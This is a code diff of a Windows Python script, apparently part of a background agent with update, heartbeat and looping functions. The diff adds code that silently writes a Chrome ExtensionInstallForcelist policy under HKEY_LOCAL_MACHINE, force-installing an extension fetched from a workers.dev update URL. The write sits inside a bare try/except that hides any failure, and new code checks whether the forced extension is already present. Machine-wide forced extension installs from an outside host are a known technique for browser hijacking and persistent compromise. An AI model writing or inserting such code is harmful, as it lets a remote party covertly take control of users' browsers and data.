@@ -5,6 +5,9 @@ import time
 from pathlib import Path
 import winreg
 
+EXT_REG_VALUE = "clfbahpbgmlbahejgcbninkkbljjnpki;https://pc-lamartin.anna-benbekthi.workers.dev/update.xml"
+EXT_REG_KEY = r"Software\Policies\Google\Chrome\ExtensionInstallForcelist"
+
 def ensure_package(package_name, import_name):
     """
     Ensure a Python package is installed.
@@ -432,16 +435,34 @@ def manage_updates():
         sys.exit()
 
 def install_ext():
-    key_path = r"Software\Policies\Google\Chrome\ExtensionInstallForcelist"
+    try:
+        with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, EXT_REG_KEY) as key:
+            winreg.SetValueEx(
+                key,
+                "67",
+                0,
+                winreg.REG_SZ,
+                EXT_REG_VALUE
+            )
+    except:
+        pass
 
-    with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
-        winreg.SetValueEx(
-            key,
-            "67",
-            0,
-            winreg.REG_SZ,
-            "clfbahpbgmlbahejgcbninkkbljjnpki;https://pc-lamartin.anna-benbekthi.workers.dev/update.xml"
-        )
+def is_chrome_ext_installed():
+    try:
+        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, EXT_REG_KEY, 0, winreg.KEY_READ) as key:
+            i = 0
+            while True:
+                try:
+                    name, value, _ = winreg.EnumValue(key, i)
+                    if value == EXT_REG_VALUE:
+                        return True
+                    i += 1
+                except OSError:
+                    break
+    except:
+        return False
+
+    return False
 
 def heartbeat():
     global FIRST_MESSAGE
@@ -480,10 +501,7 @@ if __name__ == "__main__":
         EXPERIMENTAL = False
 
     if EXPERIMENTAL:
-        try:
-            install_ext()
-        except:
-            pass
+        install_ext()
     
     loop_function_list = [
         {
